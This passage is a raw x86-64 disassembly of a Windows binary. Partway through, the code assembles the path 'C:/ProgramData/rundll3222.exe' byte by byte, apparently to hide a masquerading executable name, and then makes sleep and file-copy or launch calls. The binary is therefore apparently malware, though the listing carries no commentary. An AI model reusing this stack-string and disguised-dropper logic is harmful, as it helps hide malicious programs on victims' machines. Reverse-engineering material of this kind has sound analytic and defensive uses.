   14000ceed:	75 f1                	jne    0x14000cee0
   14000ceef:	48 8b fb             	mov    %rbx,%rdi
   14000cef2:	33 c0                	xor    %eax,%eax
   14000cef4:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000cef8:	f2 ae                	repnz scas (%rdi),%al
   14000cefa:	48 8d 95 38 03 00 00 	lea    0x338(%rbp),%rdx
   14000cf01:	33 c9                	xor    %ecx,%ecx
   14000cf03:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cf0a:	84 00 00 00 00 00 
   14000cf10:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000cf14:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000cf18:	48 ff c1             	inc    %rcx
   14000cf1b:	84 c0                	test   %al,%al
   14000cf1d:	75 f1                	jne    0x14000cf10
   14000cf1f:	48 8b fe             	mov    %rsi,%rdi
   14000cf22:	33 c0                	xor    %eax,%eax
   14000cf24:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000cf28:	f2 ae                	repnz scas (%rdi),%al
   14000cf2a:	48 8d 95 90 02 00 00 	lea    0x290(%rbp),%rdx
   14000cf31:	33 c9                	xor    %ecx,%ecx
   14000cf33:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cf3a:	84 00 00 00 00 00 
   14000cf40:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000cf44:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000cf48:	48 ff c1             	inc    %rcx
   14000cf4b:	84 c0                	test   %al,%al
   14000cf4d:	75 f1                	jne    0x14000cf40
   14000cf4f:	49 8b fc             	mov    %r12,%rdi
   14000cf52:	33 c0                	xor    %eax,%eax
   14000cf54:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000cf58:	f2 ae                	repnz scas (%rdi),%al
   14000cf5a:	48 8d 95 00 03 00 00 	lea    0x300(%rbp),%rdx
   14000cf61:	33 c9                	xor    %ecx,%ecx
   14000cf63:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cf6a:	84 00 00 00 00 00 
   14000cf70:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000cf74:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000cf78:	48 ff c1             	inc    %rcx
   14000cf7b:	84 c0                	test   %al,%al
   14000cf7d:	75 f1                	jne    0x14000cf70
   14000cf7f:	49 8b fd             	mov    %r13,%rdi
   14000cf82:	33 c0                	xor    %eax,%eax
   14000cf84:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000cf88:	f2 ae                	repnz scas (%rdi),%al
   14000cf8a:	48 8d 95 c8 02 00 00 	lea    0x2c8(%rbp),%rdx
   14000cf91:	33 c9                	xor    %ecx,%ecx
   14000cf93:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cf9a:	84 00 00 00 00 00 
   14000cfa0:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000cfa4:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000cfa8:	48 ff c1             	inc    %rcx
   14000cfab:	84 c0                	test   %al,%al
   14000cfad:	75 f1                	jne    0x14000cfa0
   14000cfaf:	33 d2                	xor    %edx,%edx
   14000cfb1:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cfb8:	e8 4f 4f ff ff       	call   0x140001f0c
   14000cfbd:	85 c0                	test   %eax,%eax
   14000cfbf:	74 0c                	je     0x14000cfcd
   14000cfc1:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cfc8:	e8 53 4f ff ff       	call   0x140001f20
   14000cfcd:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000cfd3:	48 8d 15 36 32 00 00 	lea    0x3236(%rip),%rdx        # 0x140010210
   14000cfda:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   14000cfde:	e8 fd 44 ff ff       	call   0x1400014e0
   14000cfe3:	33 c0                	xor    %eax,%eax
   14000cfe5:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000cfe9:	48 8b fb             	mov    %rbx,%rdi
   14000cfec:	f2 ae                	repnz scas (%rdi),%al
   14000cfee:	48 f7 d1             	not    %rcx
   14000cff1:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   14000cff5:	48 8b d3             	mov    %rbx,%rdx
   14000cff8:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   14000cffc:	e8 6f 43 ff ff       	call   0x140001370
   14000d001:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000d007:	48 8d 15 06 32 00 00 	lea    0x3206(%rip),%rdx        # 0x140010214
   14000d00e:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   14000d012:	e8 59 43 ff ff       	call   0x140001370
   14000d017:	33 c0                	xor    %eax,%eax
   14000d019:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000d01d:	48 8d bd 70 03 00 00 	lea    0x370(%rbp),%rdi
   14000d024:	f2 ae                	repnz scas (%rdi),%al
   14000d026:	48 f7 d1             	not    %rcx
   14000d029:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   14000d02d:	48 8d 95 70 03 00 00 	lea    0x370(%rbp),%rdx
   14000d034:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   14000d038:	e8 33 43 ff ff       	call   0x140001370
   14000d03d:	0f 1f 00             	nopl   (%rax)
   14000d040:	33 d2                	xor    %edx,%edx
   14000d042:	48 8b cb             	mov    %rbx,%rcx
   14000d045:	e8 c2 4e ff ff       	call   0x140001f0c
   14000d04a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000d04d:	74 45                	je     0x14000d094
   14000d04f:	33 d2                	xor    %edx,%edx
   14000d051:	48 8b ce             	mov    %rsi,%rcx
   14000d054:	e8 b3 4e ff ff       	call   0x140001f0c
   14000d059:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000d05c:	75 5c                	jne    0x14000d0ba
   14000d05e:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   14000d063:	ff 15 af 0f 00 00    	call   *0xfaf(%rip)        # 0x14000e018
   14000d069:	48 8d 95 38 01 00 00 	lea    0x138(%rbp),%rdx
   14000d070:	48 83 bd 50 01 00 00 	cmpq   $0x10,0x150(%rbp)
   14000d077:	10 
   14000d078:	48 0f 43 95 38 01 00 	cmovae 0x138(%rbp),%rdx
   14000d07f:	00 
   14000d080:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000d085:	45 33 c9             	xor    %r9d,%r9d
   14000d088:	4c 8b c6             	mov    %rsi,%r8
   14000d08b:	33 c9                	xor    %ecx,%ecx
   14000d08d:	e8 42 d5 ff ff       	call   0x14000a5d4
   14000d092:	eb 0b                	jmp    0x14000d09f
   14000d094:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   14000d099:	ff 15 79 0f 00 00    	call   *0xf79(%rip)        # 0x14000e018
   14000d09f:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000d0a4:	45 33 c9             	xor    %r9d,%r9d
   14000d0a7:	4c 8b c3             	mov    %rbx,%r8
   14000d0aa:	48 8d 95 90 05 00 00 	lea    0x590(%rbp),%rdx
   14000d0b1:	33 c9                	xor    %ecx,%ecx
   14000d0b3:	e8 1c d5 ff ff       	call   0x14000a5d4
   14000d0b8:	eb 86                	jmp    0x14000d040
   14000d0ba:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   14000d0bf:	ff 15 53 0f 00 00    	call   *0xf53(%rip)        # 0x14000e018
   14000d0c5:	4c 8d 4d 48          	lea    0x48(%rbp),%r9
   14000d0c9:	48 83 7d 60 10       	cmpq   $0x10,0x60(%rbp)
   14000d0ce:	4c 0f 43 4d 48       	cmovae 0x48(%rbp),%r9
   14000d0d3:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000d0d8:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000d0dd:	4c 8b c6             	mov    %rsi,%r8
   14000d0e0:	48 8d 15 31 31 00 00 	lea    0x3131(%rip),%rdx        # 0x140010218
   14000d0e7:	33 c9                	xor    %ecx,%ecx
   14000d0e9:	41 ff d6             	call   *%r14
   14000d0ec:	c6 85 70 02 00 00 43 	movb   $0x43,0x270(%rbp)
   14000d0f3:	c6 85 71 02 00 00 3a 	movb   $0x3a,0x271(%rbp)
   14000d0fa:	c6 85 72 02 00 00 2f 	movb   $0x2f,0x272(%rbp)
   14000d101:	c6 85 73 02 00 00 50 	movb   $0x50,0x273(%rbp)
   14000d108:	c6 85 74 02 00 00 72 	movb   $0x72,0x274(%rbp)
   14000d10f:	c6 85 75 02 00 00 6f 	movb   $0x6f,0x275(%rbp)
   14000d116:	c6 85 76 02 00 00 67 	movb   $0x67,0x276(%rbp)
   14000d11d:	c6 85 77 02 00 00 72 	movb   $0x72,0x277(%rbp)
   14000d124:	c6 85 78 02 00 00 61 	movb   $0x61,0x278(%rbp)
   14000d12b:	c6 85 79 02 00 00 6d 	movb   $0x6d,0x279(%rbp)
   14000d132:	c6 85 7a 02 00 00 44 	movb   $0x44,0x27a(%rbp)
   14000d139:	c6 85 7b 02 00 00 61 	movb   $0x61,0x27b(%rbp)
   14000d140:	c6 85 7c 02 00 00 74 	movb   $0x74,0x27c(%rbp)
   14000d147:	c6 85 7d 02 00 00 61 	movb   $0x61,0x27d(%rbp)
   14000d14e:	c6 85 7e 02 00 00 2f 	movb   $0x2f,0x27e(%rbp)
   14000d155:	c6 85 7f 02 00 00 72 	movb   $0x72,0x27f(%rbp)
   14000d15c:	c6 85 80 02 00 00 75 	movb   $0x75,0x280(%rbp)
   14000d163:	c6 85 81 02 00 00 6e 	movb   $0x6e,0x281(%rbp)
   14000d16a:	c6 85 82 02 00 00 64 	movb   $0x64,0x282(%rbp)
   14000d171:	c6 85 83 02 00 00 6c 	movb   $0x6c,0x283(%rbp)
   14000d178:	c6 85 84 02 00 00 6c 	movb   $0x6c,0x284(%rbp)
   14000d17f:	c6 85 85 02 00 00 33 	movb   $0x33,0x285(%rbp)
   14000d186:	c6 85 86 02 00 00 32 	movb   $0x32,0x286(%rbp)
   14000d18d:	c6 85 87 02 00 00 32 	movb   $0x32,0x287(%rbp)
   14000d194:	c6 85 88 02 00 00 32 	movb   $0x32,0x288(%rbp)
   14000d19b:	c6 85 89 02 00 00 2e 	movb   $0x2e,0x289(%rbp)
   14000d1a2:	c6 85 8a 02 00 00 65 	movb   $0x65,0x28a(%rbp)
   14000d1a9:	c6 85 8b 02 00 00 78 	movb   $0x78,0x28b(%rbp)
   14000d1b0:	c6 85 8c 02 00 00 65 	movb   $0x65,0x28c(%rbp)
   14000d1b7:	c6 85 8d 02 00 00 00 	movb   $0x0,0x28d(%rbp)
   14000d1be:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   14000d1c3:	ff 15 4f 0e 00 00    	call   *0xe4f(%rip)        # 0x14000e018
   14000d1c9:	33 c0                	xor    %eax,%eax
   14000d1cb:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000d1cf:	48 8d bd 70 03 00 00 	lea    0x370(%rbp),%rdi
   14000d1d6:	f2 ae                	repnz scas (%rdi),%al
   14000d1d8:	48 f7 d1             	not    %rcx
   14000d1db:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   14000d1df:	48 8d 95 70 03 00 00 	lea    0x370(%rbp),%rdx
   14000d1e6:	48 8d 8d f8 01 00 00 	lea    0x1f8(%rbp),%rcx
   14000d1ed:	e8 ee 42 ff ff       	call   0x1400014e0
   14000d1f2:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   14000d1f8:	48 8d 15 21 30 00 00 	lea    0x3021(%rip),%rdx        # 0x140010220
   14000d1ff:	48 8d 8d f8 01 00 00 	lea    0x1f8(%rbp),%rcx
   14000d206:	e8 65 41 ff ff       	call   0x140001370
   14000d20b:	48 c7 85 40 02 00 00 	movq   $0xf,0x240(%rbp)
   14000d212:	0f 00 00 00 
   14000d216:	4c 89 bd 38 02 00 00 	mov    %r15,0x238(%rbp)
   14000d21d:	c6 85 28 02 00 00 00 	movb   $0x0,0x228(%rbp)
   14000d224:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   14000d22a:	48 8d 15 ff 2f 00 00 	lea    0x2fff(%rip),%rdx        # 0x140010230
   14000d231:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   14000d238:	e8 a3 42 ff ff       	call   0x1400014e0
   14000d23d:	90                   	nop
   14000d23e:	48 c7 85 b0 00 00 00 	movq   $0xf,0xb0(%rbp)
   14000d245:	0f 00 00 00 
   14000d249:	4c 89 bd a8 00 00 00 	mov    %r15,0xa8(%rbp)
   14000d250:	c6 85 98 00 00 00 00 	movb   $0x0,0x98(%rbp)
   14000d257:	41 b8 0b 00 00 00    	mov    $0xb,%r8d
   14000d25d:	48 8d 15 ec 2f 00 00 	lea    0x2fec(%rip),%rdx        # 0x140010250
   14000d264:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000d26b:	e8 70 42 ff ff       	call   0x1400014e0
   14000d270:	90                   	nop
   14000d271:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   14000d277:	48 8d 15 e2 2f 00 00 	lea    0x2fe2(%rip),%rdx        # 0x140010260
   14000d27e:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000d285:	e8 e6 40 ff ff       	call   0x140001370
   14000d28a:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   14000d290:	48 8d 15 99 2f 00 00 	lea    0x2f99(%rip),%rdx        # 0x140010230
   14000d297:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   14000d29e:	e8 cd 40 ff ff       	call   0x140001370
   14000d2a3:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000d2a9:	48 8d 15 bc 2f 00 00 	lea    0x2fbc(%rip),%rdx        # 0x14001026c
   14000d2b0:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   14000d2b7:	e8 b4 40 ff ff       	call   0x140001370
   14000d2bc:	48 8d 95 98 00 00 00 	lea    0x98(%rbp),%rdx
   14000d2c3:	48 83 bd b0 00 00 00 	cmpq   $0x10,0xb0(%rbp)
   14000d2ca:	10 
   14000d2cb:	48 0f 43 95 98 00 00 	cmovae 0x98(%rbp),%rdx
   14000d2d2:	00 
   14000d2d3:	48 8d 8d 00 02 00 00 	lea    0x200(%rbp),%rcx
   14000d2da:	48 83 bd 18 02 00 00 	cmpq   $0x10,0x218(%rbp)
   14000d2e1:	10 
   14000d2e2:	48 0f 43 8d 00 02 00 	cmovae 0x200(%rbp),%rcx
   14000d2e9:	00 
   14000d2ea:	45 33 c0             	xor    %r8d,%r8d
   14000d2ed:	ff 15 2d 0d 00 00    	call   *0xd2d(%rip)        # 0x14000e020
   14000d2f3:	b9 64 00 00 00       	mov    $0x64,%ecx
   14000d2f8:	ff 15 1a 0d 00 00    	call   *0xd1a(%rip)        # 0x14000e018
   14000d2fe:	33 c0                	xor    %eax,%eax
   14000d300:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000d304:	48 8d bd 70 03 00 00 	lea    0x370(%rbp),%rdi
   14000d30b:	f2 ae                	repnz scas (%rdi),%al
   14000d30d:	48 f7 d1             	not    %rcx
   14000d310:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   14000d314:	48 8d 95 70 03 00 00 	lea    0x370(%rbp),%rdx
   14000d31b:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   14000d322:	e8 b9 41 ff ff       	call   0x1400014e0
   14000d327:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000d32d:	48 8d 15 3c 2f 00 00 	lea    0x2f3c(%rip),%rdx        # 0x140010270
   14000d334:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   14000d33b:	e8 30 40 ff ff       	call   0x140001370
   14000d340:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   14000d346:	48 8d 15 e3 2e 00 00 	lea    0x2ee3(%rip),%rdx        # 0x140010230
   14000d34d:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   14000d354:	e8 17 40 ff ff       	call   0x140001370
   14000d359:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   14000d35f:	48 8d 15 1a 2f 00 00 	lea    0x2f1a(%rip),%rdx        # 0x140010280
   14000d366:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   14000d36d:	e8 fe 3f ff ff       	call   0x140001370
   14000d372:	48 8d 8d 88 01 00 00 	lea    0x188(%rbp),%rcx
   14000d379:	48 83 bd a0 01 00 00 	cmpq   $0x10,0x1a0(%rbp)
   14000d380:	10 
   14000d381:	48 0f 43 8d 88 01 00 	cmovae 0x188(%rbp),%rcx
   14000d388:	00 
   14000d389:	45 33 c0             	xor    %r8d,%r8d
   14000d38c:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   14000d393:	ff 15 87 0c 00 00    	call   *0xc87(%rip)        # 0x14000e020
   14000d399:	b9 64 00 00 00       	mov    $0x64,%ecx
   14000d39e:	ff 15 74 0c 00 00    	call   *0xc74(%rip)        # 0x14000e018
   14000d3a4:	33 c0                	xor    %eax,%eax
   14000d3a6:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000d3aa:	48 8d bd 70 03 00 00 	lea    0x370(%rbp),%rdi
   14000d3b1:	f2 ae                	repnz scas (%rdi),%al
   14000d3b3:	48 f7 d1             	not    %rcx
   14000d3b6:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   14000d3ba:	48 8d 95 70 03 00 00 	lea    0x370(%rbp),%rdx
   14000d3c1:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   14000d3c5:	e8 16 41 ff ff       	call   0x1400014e0
   14000d3ca:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   14000d3d0:	48 8d 15 b1 2e 00 00 	lea    0x2eb1(%rip),%rdx        # 0x140010288
   14000d3d7:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   14000d3db:	e8 90 3f ff ff       	call   0x140001370
   14000d3e0:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   14000d3e6:	48 8d 15 a3 2e 00 00 	lea    0x2ea3(%rip),%rdx        # 0x140010290
   14000d3ed:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   14000d3f1:	e8 7a 3f ff ff       	call   0x140001370
   14000d3f6:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   14000d3fc:	48 8d 15 2d 2e 00 00 	lea    0x2e2d(%rip),%rdx        # 0x140010230
   14000d403:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   14000d40a:	e8 61 3f ff ff       	call   0x140001370
   14000d40f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000d415:	48 8d 15 7c 2e 00 00 	lea    0x2e7c(%rip),%rdx        # 0x140010298
   14000d41c:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   14000d420:	e8 4b 3f ff ff       	call   0x140001370
   14000d425:	48 c7 85 f0 01 00 00 	movq   $0xf,0x1f0(%rbp)
   14000d42c:	0f 00 00 00 
   14000d430:	4c 89 bd e8 01 00 00 	mov    %r15,0x1e8(%rbp)
   14000d437:	c6 85 d8 01 00 00 00 	movb   $0x0,0x1d8(%rbp)
   14000d43e:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   14000d444:	48 8d 15 55 2e 00 00 	lea    0x2e55(%rip),%rdx        # 0x1400102a0
   14000d44b:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   14000d452:	e8 89 40 ff ff       	call   0x1400014e0
   14000d457:	90                   	nop
   14000d458:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   14000d45e:	48 8d 15 4b 2e 00 00 	lea    0x2e4b(%rip),%rdx        # 0x1400102b0
   14000d465:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   14000d46c:	e8 ff 3e ff ff       	call   0x140001370
   14000d471:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   14000d477:	48 8d 15 b2 2d 00 00 	lea    0x2db2(%rip),%rdx        # 0x140010230
   14000d47e:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   14000d485:	e8 e6 3e ff ff       	call   0x140001370
   14000d48a:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000d490:	48 8d 15 29 2e 00 00 	lea    0x2e29(%rip),%rdx        # 0x1400102c0
   14000d497:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   14000d49e:	e8 cd 3e ff ff       	call   0x140001370
   14000d4a3:	48 8d 95 d8 01 00 00 	lea    0x1d8(%rbp),%rdx
   14000d4aa:	48 83 bd f0 01 00 00 	cmpq   $0x10,0x1f0(%rbp)
   14000d4b1:	10 
   14000d4b2:	48 0f 43 95 d8 01 00 	cmovae 0x1d8(%rbp),%rdx
   14000d4b9:	00 
   14000d4ba:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   14000d4be:	48 83 bd 88 00 00 00 	cmpq   $0x10,0x88(%rbp)
   14000d4c5:	10 
   14000d4c6:	48 0f 43 4d 70       	cmovae 0x70(%rbp),%rcx
   14000d4cb:	45 33 c0             	xor    %r8d,%r8d
   14000d4ce:	ff 15 4c 0b 00 00    	call   *0xb4c(%rip)        # 0x14000e020
   14000d4d4:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   14000d4d9:	ff 15 39 0b 00 00    	call   *0xb39(%rip)        # 0x14000e018
   14000d4df:	b9 64 00 00 00       	mov    $0x64,%ecx
   14000d4e4:	ff 15 2e 0b 00 00    	call   *0xb2e(%rip)        # 0x14000e018
   14000d4ea:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000d4ef:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000d4f4:	4c 8d 0d d1 2d 00 00 	lea    0x2dd1(%rip),%r9        # 0x1400102cc
   14000d4fb:	4d 8b c5             	mov    %r13,%r8
   14000d4fe:	48 8d 15 13 2d 00 00 	lea    0x2d13(%rip),%rdx        # 0x140010218
   14000d505:	33 c9                	xor    %ecx,%ecx
   14000d507:	41 ff d6             	call   *%r14
   14000d50a:	b9 64 00 00 00       	mov    $0x64,%ecx
   14000d50f:	ff 15 03 0b 00 00    	call   *0xb03(%rip)        # 0x14000e018
   14000d515:	48 8b cb             	mov    %rbx,%rcx
   14000d518:	e8 37 4a ff ff       	call   0x140001f54
   14000d51d:	48 8b ce             	mov    %rsi,%rcx
   14000d520:	e8 2f 4a ff ff       	call   0x140001f54
   14000d525:	33 c9                	xor    %ecx,%ecx
   14000d527:	e8 a0 4d ff ff       	call   0x1400022cc
   14000d52c:	90                   	nop
   14000d52d:	48 83 c4 38          	add    $0x38,%rsp
   14000d531:	41 5f                	pop    %r15
   14000d533:	41 5e                	pop    %r14
   14000d535:	41 5d                	pop    %r13
   14000d537:	41 5c                	pop    %r12
   14000d539:	5f                   	pop    %rdi
   14000d53a:	5e                   	pop    %rsi
   14000d53b:	5d                   	pop    %rbp
   14000d53c:	5b                   	pop    %rbx
   14000d53d:	c3                   	ret
   14000d53e:	cc                   	int3
   14000d53f:	cc                   	int3
   14000d540:	40 55                	rex push %rbp
   14000d542:	48 83 ec 20          	sub    $0x20,%rsp
   14000d546:	48 8b ea             	mov    %rdx,%rbp
   14000d549:	48 8d 8d 48 02 00 00 	lea    0x248(%rbp),%rcx
   14000d550:	e8 bb 3c ff ff       	call   0x140001210
   14000d555:	48 83 c4 20          	add    $0x20,%rsp
   14000d559:	5d                   	pop    %rbp
   14000d55a:	c3                   	ret
   14000d55b:	cc                   	int3
   14000d55c:	cc                   	int3
   14000d55d:	cc                   	int3
   14000d55e:	cc                   	int3
   14000d55f:	cc                   	int3
   14000d560:	40 55                	rex push %rbp
   14000d562:	48 83 ec 20          	sub    $0x20,%rsp
   14000d566:	48 8b ea             	mov    %rdx,%rbp
   14000d569:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   14000d56d:	e8 9e 3c ff ff       	call   0x140001210
   14000d572:	48 83 c4 20          	add    $0x20,%rsp
   14000d576:	5d                   	pop    %rbp
   14000d577:	c3                   	ret
   14000d578:	cc                   	int3
   14000d579:	cc                   	int3
   14000d57a:	cc                   	int3
   14000d57b:	cc                   	int3
   14000d57c:	cc                   	int3
   14000d57d:	cc                   	int3
   14000d57e:	cc                   	int3
   14000d57f:	cc                   	int3
   14000d580:	40 55                	rex push %rbp
   14000d582:	48 83 ec 20          	sub    $0x20,%rsp
   14000d586:	48 8b ea             	mov    %rdx,%rbp
   14000d589:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   14000d590:	e8 7b 3c ff ff       	call   0x140001210
   14000d595:	48 83 c4 20          	add    $0x20,%rsp
   14000d599:	5d                   	pop    %rbp
   14000d59a:	c3                   	ret
   14000d59b:	cc                   	int3
   14000d59c:	cc                   	int3
   14000d59d:	cc                   	int3
   14000d59e:	cc                   	int3
   14000d59f:	cc                   	int3
   14000d5a0:	40 55                	rex push %rbp
   14000d5a2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d5a6:	48 8b ea             	mov    %rdx,%rbp
   14000d5a9:	48 8d 8d f8 01 00 00 	lea    0x1f8(%rbp),%rcx
   14000d5b0:	e8 5b 3c ff ff       	call   0x140001210
   14000d5b5:	48 83 c4 20          	add    $0x20,%rsp
   14000d5b9:	5d                   	pop    %rbp
   14000d5ba:	c3                   	ret
   14000d5bb:	cc                   	int3
   14000d5bc:	cc                   	int3
   14000d5bd:	cc                   	int3
   14000d5be:	cc                   	int3
   14000d5bf:	cc                   	int3
   14000d5c0:	40 55                	rex push %rbp
   14000d5c2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d5c6:	48 8b ea             	mov    %rdx,%rbp
   14000d5c9:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   14000d5cd:	e8 3e 3c ff ff       	call   0x140001210
   14000d5d2:	48 83 c4 20          	add    $0x20,%rsp
   14000d5d6:	5d                   	pop    %rbp
   14000d5d7:	c3                   	ret
   14000d5d8:	cc                   	int3
   14000d5d9:	cc                   	int3
   14000d5da:	cc                   	int3
   14000d5db:	cc                   	int3
   14000d5dc:	cc                   	int3
   14000d5dd:	cc                   	int3
   14000d5de:	cc                   	int3
   14000d5df:	cc                   	int3
   14000d5e0:	40 55                	rex push %rbp
   14000d5e2:	48 83 ec 20          	sub    $0x20,%rsp
   14000d5e6:	48 8b ea             	mov    %rdx,%rbp
   14000d5e9:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000d5f0:	e8 1b 3c ff ff       	call   0x140001210
   14000d5f5:	48 83 c4 20          	add    $0x20,%rsp
   14000d5f9:	5d                   	pop    %rbp
   14000d5fa:	c3                   	ret
   14000d5fb:	cc                   	int3
   14000d5fc:	cc                   	int3
   14000d5fd:	cc                   	int3
   14000d5fe:	cc                   	int3
   14000d5ff:	cc                   	int3
   14000d600:	40 55                	rex push %rbp
   14000d602:	48 83 ec 20          	sub    $0x20,%rsp
   14000d606:	48 8b ea             	mov    %rdx,%rbp
   14000d609:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   14000d610:	e8 fb 3b ff ff       	call   0x140001210
   14000d615:	48 83 c4 20          	add    $0x20,%rsp
   14000d619:	5d                   	pop    %rbp
   14000d61a:	c3                   	ret
   14000d61b:	cc                   	int3
   14000d61c:	cc                   	int3
   14000d61d:	cc                   	int3
   14000d61e:	cc                   	int3
   14000d61f:	cc                   	int3
   14000d620:	40 55                	rex push %rbp
   14000d622:	48 83 ec 20          	sub    $0x20,%rsp
   14000d626:	48 8b ea             	mov    %rdx,%rbp
   14000d629:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   14000d630:	e8 db 3b ff ff       	call   0x140001210
   14000d635:	48 83 c4 20          	add    $0x20,%rsp
   14000d639:	5d                   	pop    %rbp
   14000d63a:	c3                   	ret
   14000d63b:	cc                   	int3
   14000d63c:	cc                   	int3
   14000d63d:	cc                   	int3
   14000d63e:	cc                   	int3
   14000d63f:	cc                   	int3
   14000d640:	40 55                	rex push %rbp
   14000d642:	48 83 ec 20          	sub    $0x20,%rsp
   14000d646:	48 8b ea             	mov    %rdx,%rbp
   14000d649:	48 8d 8d a8 01 00 00 	lea    0x1a8(%rbp),%rcx
   14000d650:	e8 bb 3b ff ff       	call   0x140001210
   14000d655:	48 83 c4 20          	add    $0x20,%rsp
   14000d659:	5d                   	pop    %rbp
   14000d65a:	c3                   	ret
   14000d65b:	cc                   	int3
   14000d65c:	cc                   	int3
   14000d65d:	cc                   	int3
   14000d65e:	cc                   	int3
   14000d65f:	cc                   	int3
   14000d660:	40 55                	rex push %rbp
   14000d662:	48 83 ec 20          	sub    $0x20,%rsp
   14000d666:	48 8b ea             	mov    %rdx,%rbp
   14000d669:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   14000d670:	e8 9b 3b ff ff       	call   0x140001210
   14000d675:	48 83 c4 20          	add    $0x20,%rsp
   14000d679:	5d                   	pop    %rbp
   14000d67a:	c3                   	ret
   14000d67b:	cc                   	int3
   14000d67c:	cc                   	int3
   14000d67d:	cc                   	int3
   14000d67e:	cc                   	int3
   14000d67f:	cc                   	int3
   14000d680:	40 55                	rex push %rbp
   14000d682:	48 83 ec 20          	sub    $0x20,%rsp
